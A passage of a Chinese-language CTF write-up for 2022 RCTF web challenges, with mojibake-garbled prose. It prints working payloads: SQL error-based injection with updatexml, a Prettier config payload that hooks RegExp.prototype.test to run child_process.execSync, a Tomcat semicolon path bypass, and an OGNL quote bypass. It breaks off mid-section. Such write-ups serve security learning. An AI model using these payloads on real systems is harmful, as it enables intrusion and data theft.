<p><img src="/post/2022RCTF/image-20230305002520151.png" alt="image-20230305002520151"></p>
<p>åœ¨å…¶<code>master</code>åˆ†æ”¯è¿›è¡Œäº†<code>pull request</code>ï¼Œå¯¹æ­¤å¤„è¿›è¡Œäº†ä¿®æ”¹ï¼Œä½†æ˜¯åœ¨mainåˆ†æ”¯ä»ç„¶å­˜åœ¨æ—§ä»£ç çš„æ¼æ´ï¼Œæ‰€ä»¥ä»ç„¶æ˜¯å¯ä»¥åˆ©ç”¨çš„</p>
<p>è€Œä¸”åˆ†æå‰é¢æ–¹æ³•</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">sqlStatement <span class="keyword">instanceof</span> MySqlCreateTableStatement</span><br></pre></td></tr></table></figure>

<p>çŸ¥é“è¯¥æ–¹æ³•æ˜¯åœ¨<strong>create</strong>çš„æ—¶å€™è§¦å‘ï¼Œä¼šå…ˆè¿›è¡Œè§£æsqlè¯­å¥ï¼Œç„¶åè¿›è¡Œåˆ›å»ºè¡¨ï¼Œå¦‚æœåˆ›å»ºè¡¨æˆåŠŸï¼Œåˆ™å°†è¡¨åæ·»åŠ åˆ°åˆ—è¡¨ä¸­</p>
<p>é‚£ä¹ˆåœ¨ä¸€ä¸ªåˆ›å»ºè¡¨çš„sqlè¯­å¥ä¸­æˆ‘ä»¬å¦‚ä½•è®©å®ƒå›æ˜¾å‡ºæˆ‘ä»¬éœ€è¦çš„å†…å®¹å‘¢ï¼Œ</p>
<p>å…³é”®å°±åœ¨è¿™é‡ŒæŠ›å‡ºå¼‚å¸¸</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="built_in">this</span>.logger.error(e.getMessage(), e);</span><br><span class="line">      <span class="keyword">return</span> AjaxResult.error(<span class="string">&quot;åˆ›å»ºè¡¨ç»“æ„å¼‚å¸¸[&quot;</span> + e.getMessage() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ„é€ ä¸€ä¸ªæŠ¥é”™çš„è¡¨ï¼Œä¸”è®©å…¶ä¸­åŒ…å«flagæ•°æ®</p>
<p>&#x3D;&gt;ç”¨æŠ¥é”™æ³¨å…¥æŸ¥è¯¢flagçš„æ•°æ®ï¼Œç„¶åæŠŠæ•°æ®å¯¼å…¥åˆ°åˆ›å»ºçš„æ–°è¡¨ä¸­å»</p>
<p>æ‰€ä»¥äºæ˜¯æ ¹æ®æ„é€ </p>
<p>åœ¨ç½‘ç«™<code>/tool/gen/createTable</code>ä»¥<code>post</code>æ–¹å¼æäº¤<code>sql</code>è¯­å¥</p>
<p>ã€æ³¨æ„è¡¨åä¸èƒ½å’Œæ•°æ®åº“å·²ç»æœ‰çš„è¡¨åç›¸åŒå¦åˆ™ä¼šåˆ›å»ºè¡¨å¤±è´¥ã€‘</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="keyword">create</span> <span class="keyword">table</span> a <span class="keyword">as</span> <span class="keyword">select</span><span class="comment">/**/</span>updatexml(<span class="number">0x7e</span>,(<span class="keyword">select</span><span class="comment">/**/</span>flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/post/2022RCTF/image-20230305005514205.png" alt="image-20230305005514205"></p>
<h2 id="PrettierOnline"><a href="#PrettierOnline" class="headerlink" title="PrettierOnline"></a>PrettierOnline</h2><blockquote>
<p>hint:<code>Prettier my(not your) code</code></p>
<p>é™„ä»¶ï¼š<a href="https://adworld.xctf.org.cn/media/file/task/edc2b784-4b87-4b94-800f-1dc4fc61060e.tar">https://adworld.xctf.org.cn/media/file/task/edc2b784-4b87-4b94-800f-1dc4fc61060e.tar</a></p>
</blockquote>
<blockquote>
<p>ä»€ä¹ˆæ˜¯Prettierï¼Ÿ</p>
<p>ä¸€ä¸ªâ€œæœ‰æ€åº¦â€çš„<a href="https://www.prettier.cn/">ä»£ç æ ¼å¼åŒ–å·¥å…·</a></p>
</blockquote>
<p>è¿™ä¸ªç¯å¢ƒä¹Ÿæœ‰ç‚¹é—®é¢˜ï¼Œè™½ç„¶èƒ½å¤Ÿå®Œæˆæ­å»ºå¹¶ä¸”è®¿é—®ï¼Œä½†æ˜¯è°ƒç”¨<code>Prettier</code>æ—¶ï¼Œå¯¹äºèº«ä»½çš„éªŒè¯ä¸€ç›´æç¤º</p>
<p><img src="/post/2022RCTF/image-20230217204716995.png" alt="image-20230217204716995"></p>
<p>çŒœæµ‹æ˜¯ä¸æ˜¯<code>Prettier</code>å®˜æ–¹å¯¹å…¬å¼€å¯è°ƒç”¨apiè¿›è¡Œäº†ä¿®æ”¹ï¼Œå¯¼è‡´åœ¨æ­¤é¢˜å®¹å™¨ä¸­æ— æ³•è¿è¡Œ<code>Prettier</code></p>
<p>åªèƒ½è®°ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„wpçš„çŸ¥è¯†ç‚¹äº†ã€ä¸‹æ¬¡ä¸€å®šè¦ç°åœºæå‡ºæ¥ï¼Œäº‹åæç¡®å®çƒ¦äºº</p>
<hr>
<p>è¿™ä¸ªé¢˜çš„æ€è·¯æœ‰ç‚¹å¤´ç–¼</p>
<p>è¿™æ˜¯å®˜æ–¹é…ç½®æ–‡ä»¶ä»‹ç»<a href="https://prettier.io/docs/en/configuration.html">https://prettier.io/docs/en/configuration.html</a></p>
<p>å…ˆçœ‹çœ‹ç¯å¢ƒæ–‡ä»¶ï¼Œä¹‹å‰æ²¡å­¦è¿‡<code>node.js</code>è¿™æ¬¡å­¦ä¹ ä¸€ä¸‹</p>
<h3 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a><code>index.js</code></h3><p>åˆ†æåŠ åœ¨æ³¨é‡Š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¼•å…¥æ–‡ä»¶ç³»ç»Ÿã€åŠ å¯†ã€æ ¼å¼åŒ–å·¥å…·ã€è¿›ç¨‹æ§åˆ¶ç­‰æ¨¡å—</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> prettier = <span class="built_in">require</span>(<span class="string">&#x27;prettier&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; nextTick, exit &#125; = <span class="built_in">require</span>(<span class="string">&#x27;process&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼•å…¥è‡ªå®šä¹‰çš„ fw æ¨¡å—</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./fw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»æ–‡ä»¶ ./dist/id ä¸­è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨ trim() æ–¹æ³•å»é™¤ä¸¤ç«¯çš„ç©ºæ ¼</span></span><br><span class="line"><span class="keyword">const</span> id = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./dist/id&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">toString</span>(<span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">trim</span>()</span><br><span class="line"></span><br><span class="line"> <span class="comment">// åˆ é™¤æ–‡ä»¶ ./dist/id</span></span><br><span class="line">fs.<span class="title function_">unlinkSync</span>(<span class="string">&#x27;./dist/id&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// è°ƒç”¨ prettier.resolveConfig æ–¹æ³•ï¼Œå¼‚æ­¥åœ°è¯»å–å’Œè§£æ .prettierrc é…ç½®æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨è¯¥é…ç½®æ–‡ä»¶æ ¼å¼åŒ–ä»£ç </span></span><br><span class="line"><span class="comment">//$&#123;__dirname&#125;æ˜¯node.jsçš„ä¸€ä¸ªç‰¹æ®Šå˜é‡ï¼Œç”¨äºè¯»å–å½“å‰æ¨¡å—æ‰€åœ¨çš„ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">prettier.<span class="title function_">resolveConfig</span>(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/.prettierrc`</span>).<span class="title function_">then</span>(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// æ ¼å¼åŒ–å½“å‰æ–‡ä»¶çš„ä»£ç </span></span><br><span class="line">  <span class="keyword">const</span> ret = prettier.<span class="title function_">format</span>(fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&#x27;utf-8&#x27;</span>), config)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä½¿ç”¨ SHA256 ç®—æ³•è®¡ç®— id çš„å“ˆå¸Œå€¼ï¼Œå¹¶ä»¥åå…­è¿›åˆ¶æ ¼å¼è¾“å‡ºä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">  <span class="keyword">const</span> o = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>).<span class="title function_">update</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(id, <span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_">digest</span>().<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// å°† id ä½œä¸ºæ–‡ä»¶åå†™å…¥ dist ç›®å½•ä¸‹</span></span><br><span class="line">  fs.<span class="title function_">writeFileSync</span>(<span class="string">`./dist/<span class="subst">$&#123;id&#125;</span>`</span>, o, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// å°†æ ¼å¼åŒ–åçš„ä»£ç å†™å…¥æ–‡ä»¶ ./dist/ret.js ä¸­</span></span><br><span class="line">  fs.<span class="title function_">writeFileSync</span>(<span class="string">&#x27;./dist/ret.js&#x27;</span>, ret, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// ä½¿ç”¨ nextTick æ–¹æ³•æ³¨å†Œä¸€ä¸ªå›è°ƒå‡½æ•°è·‘å‡ºä¸€ä¸ªé”™è¯¯</span></span><br><span class="line">  <span class="title function_">nextTick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No NextTick here!&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">    </span><br><span class="line">  <span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œæ ¼å¼åŒ–ã€å“ˆå¸Œè®¡ç®—å¹¶ç”Ÿæˆæ–°çš„æ–‡ä»¶ã€‚</p>
<p>åœ¨è¿™æ®µä»£ç ä¸­æˆ‘ä»¬å‘ç°</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">resolveConfig</span><span class="params">(`$&#123;__dirname&#125;/.prettierrc`)</span></span></span><br></pre></td></tr></table></figure>

<p>.prettierrcæ–‡ä»¶å®é™…ä¸Šæ˜¯ä¸åœ¨å½“å‰ç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜æœªç”Ÿæˆï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨å…¶è‡ªèº«æ ¼å¼ä»£ç ï¼Œè®©å…¶åŠ è½½æˆ‘ä»¬è‡ªå·±çš„è®¾ç½®é…ç½®ä¿¡æ¯ï¼Œå®ç°æƒ³è¦çš„å‘½ä»¤æ‰§è¡Œç­‰ç­‰æ“ä½œ</p>
<h3 id="fw-js"><a href="#fw-js" class="headerlink" title="fw.js"></a>fw.js</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Module</span> = <span class="built_in">require</span>(<span class="string">&#x27;module&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> oldRequire = <span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">require</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">require</span> = <span class="keyword">function</span> (<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> id !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bye&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> isCore = <span class="title class_">Module</span>.<span class="title function_">isBuiltin</span>(id)</span><br><span class="line">  <span class="keyword">if</span> (isCore) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/fs|path|util|os/</span>.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bye, &#x27;</span> + id)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    id = <span class="title class_">Module</span>.<span class="title function_">_resolveFilename</span>(id, <span class="variable language_">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> oldRequire.<span class="title function_">call</span>(oldRequire, id)</span><br><span class="line">&#125;</span><br><span class="line">process.<span class="property">dlopen</span> = <span class="function">() =&gt;</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥æ˜¯å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤çš„ä¸€ä¸ªæ¨¡å—ï¼Œé¦–å…ˆåˆ¤æ–­å‚æ•°<code>id</code>æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="regexp">/fs|path|util|os/</span>.<span class="title function_">test</span>(id))</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨<code>test(id)</code>,å¦‚æœ<code>id</code>æ˜¯ä¸€ä¸ªNode.jsçš„æ ¸å¿ƒæ¨¡å—ï¼Œå¦‚<code>fs</code>ã€<code>path</code>ã€<code>util</code>æˆ–<code>os</code>ç­‰ï¼Œåˆ™å…è®¸åŠ è½½è¯¥æ¨¡å—ï¼Œå¦åˆ™ä¹Ÿä¼šæŠ›å‡ºä¸€ä¸ªé”™</p>
<p>è¯¯</p>
<p>å¦å¤–ï¼Œ<code>process.dlopen</code>è¢«é‡å†™ä¸ºç©ºå‡½æ•°ï¼Œä»£è¡¨æ— æ³•ä½¿ç”¨<code>process.dlopen</code>åŠ è½½æ–°çš„æœ¬åœ°æ¨¡å—</p>
<blockquote>
<p><code>process.dlopen</code>æ˜¯Node.jsçš„ä¸€ä¸ªC++å±‚é¢çš„å‡½æ•°ï¼Œç”¨äºåœ¨Node.jsè¿›ç¨‹ä¸­åŠ¨æ€åŠ è½½æœ¬åœ°æ¨¡å—</p>
</blockquote>
<h3 id="js-payload"><a href="#js-payload" class="headerlink" title="js payload"></a>js payload</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">//è§£æ.prettierrc</span></span><br><span class="line">  <span class="attr">parser</span>: <span class="string">&quot;.prettierrc&quot;</span>,</span><br><span class="line">  <span class="regexp">/x|x/</span>.<span class="property">__proto__</span>.<span class="property">test</span>=<span class="function">()=&gt;</span><span class="literal">true</span>,</span><br><span class="line">  <span class="variable language_">module</span>.<span class="property">exports</span>=<span class="function">()=&gt;</span><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;pwd;cat flag&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Hook RegExp.prototype.test</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™æ®µä»£ç çš„ç›®çš„å°±æ˜¯å› ä¸ºåœ¨ç›®å½•ä¸‹å¹¶æ²¡æœ‰<code>.prettierrc</code>é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥åˆ©ç”¨è§£æå™¨è§£æ<code>.prettierrcï¼Œ</code></p>
<p>é‚£ä¹ˆ</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/x|x/</span>.__proto__.test=<span class="function"><span class="params">()</span>=&gt;</span><span class="literal">true</span>,</span><br><span class="line">module.<span class="built_in">exports</span>=<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;pwd;cat flag&quot;</span>).toString()</span><br></pre></td></tr></table></figure>

<p>ä¸­çš„å†…å®¹å°±ä¼šè¢«å½“ä½œ.prettierrcæ–‡ä»¶çš„å†…å®¹ï¼Œç„¶ååœ¨index.jsä¸­è¿›è¡Œè§£æï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤</p>
</blockquote>
<blockquote>
<p><code>parser: &quot;.prettierrc&quot;</code>ï¼šè®¾ç½® Prettier çš„è§£æå™¨ä¸º <code>.prettierrc</code>ï¼Œè¿™æ„å‘³ç€ Prettier ä¼šè¯»å–å’Œè§£æ <code>.prettierrc</code> æ–‡ä»¶æ¥è·å–æ ¼å¼åŒ–é€‰é¡¹ã€‚</p>
<p><code>/x|x/.__proto__.test=()=&gt;true</code>ï¼šé€šè¿‡ä¿®æ”¹ <code>RegExp</code> å¯¹è±¡çš„åŸå‹æ¥åŠ«æŒæ‰€æœ‰æ­£åˆ™è¡¨è¾¾å¼çš„ <code>test()</code> æ–¹æ³•ï¼Œä½¿å…¶å§‹ç»ˆè¿”å›ä¸º<code>true</code>è¿™æ ·å°±å¯ä»¥ä½¿å¾—<code>id</code>ç»•è¿‡<code>fw.js</code>çš„è¿‡æ»¤äº†ï¼Œä½¿å¾—å¯ä»¥requireä»»ä½•ä¸œè¥¿ï¼Œä»¥è‡³äº<code>child_process</code>ï¼Œæ­£åˆ™è¡¨è¾¾å¼ <code>/x|x/</code> å¯ä»¥åŒ¹é…ä»»ä½•å­—ç¬¦ä¸²ã€‚</p>
<p><code>module.exports=()=&gt;require(&quot;child_process&quot;).execSync(&quot;pwd;cat flag&quot;).toString()</code>ï¼šå°† <code>module.exports</code> è®¾ç½®ä¸ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œè¯¥å‡½æ•°è°ƒç”¨ä¸€ä¸ªå­è¿›ç¨‹<code>child_process</code>ï¼Œç„¶åè°ƒç”¨<code>execSync</code> æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ <code>pwd;cat flag</code>ï¼Œå¹¶å°†å½“å‰ç›®å½•<code>flag</code>ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚</p>
</blockquote>
<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><blockquote>
<p>hint:xxe me,å°è¯•ç¼–ç ç»•è¿‡ xxe è¿‡æ»¤å™¨</p>
</blockquote>
<p><img src="/post/2022RCTF/image-20230123144129416.png" alt="image-20230123144129416"></p>
<p>è¿™æ˜¯ä¸€é“xxeçš„é¢˜ç›®ï¼Œå¯¹å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥å¯¹è¿‡æ»¤å†…å®¹è¿›è¡Œç¼–ç ç»•è¿‡è¿‡æ»¤è¾¾åˆ°æ–‡ä»¶å†…å®¹è¯»å–çš„ç›®çš„</p>
<p>åæ±‡ç¼–jaråŒ…ï¼Œ</p>
<p>åœ¨<code>com.example.demo.filter.MyFilter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (isWhite(request) || auth()) &#123;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      response.getWriter().write(<span class="string">&quot;auth fail&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isWhite</span><span class="params">(ServletRequest req)</span> &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest)req;</span><br><span class="line">    <span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">auth</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œçœ‹åˆ°å¼€å§‹é¡µé¢çš„<code>auth fail</code>çš„è§¦å‘æ¡ä»¶</p>
<p><code>if (isWhite(request) || auth())</code></p>
<p>å…¶ä¸­</p>
<p><code>auth()</code>æ˜¯ä¸€å®šè¿”å›<code>false</code></p>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©<code>isWhite(request)</code>è¿”å›<code>true</code>ï¼Œæ‰èƒ½ç»§ç»­åç»­æ­¥éª¤</p>
<p>åœ¨isWhite()ä¸­å¯çŸ¥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éœ€è¦<code>URI</code>åä»¥<code>ico</code>ç»“å°¾ï¼Œä½†æ˜¯åˆä¸èƒ½è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œä¸ç„¶åé¢çš„è®¿é—®éƒ½æ˜¯å¤±è´¥çš„</p>
<p>è¿™é‡Œå°±éœ€è¦åˆ©ç”¨ä¸€ä¸ªçŸ¥è¯†ç‚¹</p>
<p><code>Tomcat ä»¥;ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´åœ¨<code>;</code>åçš„ä¸è¿›è¡Œè§£æ</p>
<p>äºæ˜¯æ„é€ å‡º</p>
<p><code>http://127.0.0.1:8899/index;123.ico</code></p>
<p><img src="/post/2022RCTF/image-20230123151457117.png" alt="image-20230123151457117"></p>
<p>è™½ç„¶æ˜¾ç¤º<code>500</code>ï¼Œä½†å…¶å®æ˜¯æˆåŠŸäº†çš„</p>
</blockquote>
<p>ç„¶åå°±éœ€è¦è€ƒè™‘å¦‚ä½•è¿›è¡Œ<code>xxe</code>æ³¨å…¥</p>
<p>åœ¨<code>com.example.demo.controller.DemoController</code>ä¸­ï¼Œæ­£å¥½æœ‰ä¸ªåä¸º<code>xxe</code>çš„å‡½æ•°</p>
<p><img src="/post/2022RCTF/image-20230123153904078.png" alt="image-20230123153904078"></p>
<p>åœ¨<code>xxe</code>å‡½æ•°ä¸Šé¢è¿˜æœ‰ä¸ª<code>sayHello</code>å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (password.length() &gt; <span class="number">50</span> || password.indexOf(<span class="string">&quot;&#x27;&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;not allow&quot;</span>;</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‘ç°å…¶å¯¹<code>password</code>è¿™ä¸ªå‚æ•°ä¸­çš„æ•°æ®ä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼Œé•¿åº¦<code>ä¸èƒ½è¶…è¿‡50</code>ä¸ªå­—ç¬¦ï¼Œä¸”å…¶ä¸­ä¸èƒ½æœ‰å•å¼•å·<code>&#39;</code></p>
<p>å¦åˆ™å°±ä¼šå¤±è´¥è¿”å›</p>
</blockquote>
<blockquote>
<p>å¹¶ä¸”åœ¨<code>sayHello</code>å‡½æ•°ä¸­ï¼Œè¿˜æœ‰å…¶ä»–ä¸‰ä¸ªå‚æ•°</p>
<p><code>String poc, String type, String yourclasses</code></p>
<p>è¿™ä¸‰ä¸ªå‚æ•°ä¹Ÿæ˜¯æœ€åä¼ å…¥<code>xxeå‡½æ•°</code>çš„ä¸‰ä¸ªå‚æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> xxe(poc, type, classes);</span><br></pre></td></tr></table></figure>

<p>ã€ä½†æ˜¯<code>yourclasses</code>å‚æ•°è¢«è¿›è¡Œäº†åˆ†å‰²ï¼Œä»¥<code>,</code>ä¸ºåˆ†å‰²ï¼Œåˆ†æˆ4ä»½</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] classes = yourclasses.split(<span class="string">&quot;,&quot;</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯¹<code>yourclasses</code>çš„å‚æ•°èµ‹å€¼éœ€è¦è€ƒè™‘</p>
</blockquote>
<blockquote>
<p>&#x3D;&#x3D;&gt;<code>xxeæ³¨å…¥</code>éœ€è¦å››ä¸ªå‚æ•°</p>
<p><code>String password, String poc, String type, String yourclasses</code></p>
<p>å…¶ä¸­</p>
<ul>
<li><code>password</code>å‚æ•°å€¼éœ€è¦ç»•è¿‡å•å¼•å·ï¼ˆå¸¸è¯†çŒœæµ‹æ˜¯sqlæ³¨å…¥ï¼Œä»¥å•å¼•å·é—­åˆï¼Œç”¨ä¸‡èƒ½å¯†ç </li>
<li><code>poc</code>å‚æ•°å€¼æŒ‰å¸¸ç†åº”è¯¥å°±æ˜¯xxeæ³¨å…¥çš„å†…å®¹</li>
<li><code>type</code>å‚æ•°å€¼è¿˜ä¸å¤ªç¡®å®š</li>
<li><code>yourclasses</code>å‚æ•°å€¼ä»¥<code>,</code>åˆ†å‰²ä¸º4ä»½ï¼Œå…·ä½“å€¼å¯èƒ½å°±æ˜¯å¸®åŠ©<code>poc</code>è¿›è¡Œç»•è¿‡è¿‡æ»¤çš„</li>
</ul>
</blockquote>
<p>åŒæ ·åœ¨è¯¥ç±»ä¸­ï¼Œåº•ä¸‹å°±æ˜¯è¿‡æ»¤é»‘åå•</p>
<p><img src="/post/2022RCTF/image-20230123154032645.png" alt="image-20230123154032645"></p>
<blockquote>
<p>å¯ä»¥çœ‹åˆ°å°†<code>!DOCTYPE</code>è¿›è¡Œäº†è¿‡æ»¤</p>
</blockquote>
<h3 id="passwordå‚æ•°"><a href="#passwordå‚æ•°" class="headerlink" title="passwordå‚æ•°"></a>passwordå‚æ•°</h3><p>æŸ¥æ‰¾passwordå‚æ•°åœ¨å“ªé‡Œè¢«åˆ©ç”¨æ—¶</p>
<p>åœ¨<code>com.example.demo.mapper.UserProvider</code></p>
<p><img src="/post/2022RCTF/image-20230124131633821.png" alt="image-20230124131633821"></p>
<p>å‘ç°å…¶æœç„¶è¢«<code>sql</code>æŸ¥è¯¢åˆ©ç”¨ ï¼Œä»¥<code>&#39;)</code>é—­åˆ</p>
<p>ä½†æ˜¯å•å¼•å·è¢«è¿‡æ»¤äº†å¦‚ä½•é—­åˆï¼Œç„¶åå®ç°ä¸‡èƒ½å¯†ç å‘¢</p>
<h4 id="Ognl-æ³¨å…¥ç»•è¿‡å¼•ç”¨è¿‡æ»¤"><a href="#Ognl-æ³¨å…¥ç»•è¿‡å¼•ç”¨è¿‡æ»¤" class="headerlink" title="Ognl æ³¨å…¥ç»•è¿‡å¼•ç”¨è¿‡æ»¤"></a>Ognl æ³¨å…¥ç»•è¿‡å¼•ç”¨è¿‡æ»¤</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">@java</span>.lang.Character<span class="meta">@toString(39)</span>&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ç®€è€Œè¨€ä¹‹ï¼Œ<code>mybatis</code>ä¼šè°ƒç”¨<code>OGNL parser</code>æ¥è§£æ<code>sql</code>è¯­å¥ä¸­ä»¥ <code>$&#123;&#125;</code> æˆ–è€… <code>#&#123;&#125;</code> ä¸­çš„è¡¨è¾¾å¼å¹¶å°†æ‰§è¡Œç»“æœæ›¿æ¢è¿›å»</p>
</blockquote>
<p>è¿™é‡Œçš„<code>39</code>å°±æ˜¯å•å¼•å·çš„<code>ascii</code>ç¼–ç </p>
<p>äºæ˜¯æ„é€ <code>sql</code>æ³¨å…¥ä¸‡èƒ½å¯†ç </p>
<blockquote>
